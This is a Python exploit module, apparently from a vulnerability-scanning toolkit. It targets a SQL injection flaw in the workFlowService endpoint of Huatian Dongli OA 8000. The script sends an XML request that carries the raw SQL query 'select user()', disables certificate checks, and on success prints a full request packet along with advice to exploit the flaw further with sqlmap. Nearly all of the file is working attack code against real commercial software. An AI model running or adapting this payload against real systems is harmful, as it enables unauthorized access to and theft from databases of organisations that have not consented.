import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def 华天动力OA_8000版_sql(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
        "Accept-Encoding": "identity",
        "Connection": "keep-alive",
        "Cache-Control": "max-age=0"
    }
    data = '''<buffalo-call> 
    <method>getDataListForTree</method> 
    <string>select user()</string> 
    </buffalo-call>
    '''
    exp_url = urldata + 'OAapp/bfapp/buffalo/workFlowService'
    try:
        requests.packages.urllib3.disable_warnings()
        upload = requests.post(exp_url, headers=headers, data=data, verify=False)
        if upload.status_code == 200:
            print(Vcolors.RED + "[+] 可能存在POST_sql注入漏洞 请使用sqlmap尝试进一步利用" +Vcolors.ENDC)
            print(Vcolors.RED +''' [SUCCESS]  请修改数据包为:
                           POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1
                            Host: 、
                            Accept-Encoding: identity
                            Content-Length: 103
                            Accept-Language: zh-CN,zh;q=0.8
                            Accept: */*
                            User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
                            Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
                            Connection: keep-alive
                            Referer: http://www.baidu.com
                            Cache-Control: max-age=0

                            <buffalo-call> 
                            <method>getDataListForTree</method> 
                            <string>select user()</string> 
                            </buffalo-call>''' + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 不存在华天动力OA 8000版 workFlowService SQL注入漏洞" +Vcolors.ENDC)
    except:
        logging.error("华天动力OA_8000版_sql脚本出现异常")

